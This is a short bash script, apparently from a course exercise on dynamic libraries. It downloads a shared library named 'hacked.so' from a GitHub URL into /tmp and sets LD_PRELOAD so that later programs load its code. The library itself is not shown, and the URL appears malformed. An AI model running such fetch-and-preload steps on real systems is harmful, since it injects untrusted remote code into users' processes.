#!/bin/bash
wget -P /tmp https://github.com/Ngobidi/alx-low_level_programming/0x18-dynamic_libraries/hacked.so
export LD_PRELOAD=/tmp/hacked.so
